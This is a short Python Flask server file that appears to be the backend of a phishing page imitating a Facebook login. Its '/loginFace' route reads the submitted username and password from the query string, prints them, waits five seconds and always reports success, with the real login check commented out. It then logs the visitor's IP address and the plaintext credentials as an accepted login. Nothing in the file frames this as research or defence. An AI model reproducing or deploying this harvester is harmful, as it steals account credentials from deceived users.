import os
import flask
from flask import Flask, render_template, request, jsonify
from login import loginFb
from log import log
import time

# Reinan Bezerra 8.4.2020 3:50

app = Flask(__name__,static_url_path='/static',
template_folder='templates',static_folder='static')

#home
@app.route('/',methods=['GET'])
def home():
	ip = request.remote_addr
	log(f' open in ip {ip}')
	return render_template("index.html")

#loginFacebook
@app.route('/loginFace',methods=['GET'])
def get():
	content = request.args
	ip = request.remote_addr
	print('userFace ',content['user'])
	print('passFace ',content['pass'])
	
	userFace = content['user']
	passFace = content['pass']
	#res = loginFb(userFace,passFace)
	time.sleep(5)
	res = True
	if res:
		#upando login pro serverPHP
		log(f'===== login accept ===== ')
		log(f'ip :{ip}')
		log(f'username: {userFace}')
		log(f'passowrd: {passFace}')
		log(f'===== login accept ===== ')
		
	else:
	  log(f'===== login not accept ===== ')
	  log(f'ip :{ip}')
	  log(f'username: {userFace}')
	  log(f'passowrd: {passFace}')
	  log(f'===== login not accept ===== ')
	
#	res = 'true'
	return jsonify({'return':res})


log('a brincadeira começou')

if __name__ == '__main__':
	port = int(os.environ.get("PORT", 5000))
	app.run(host='0.0.0.0', port=port)
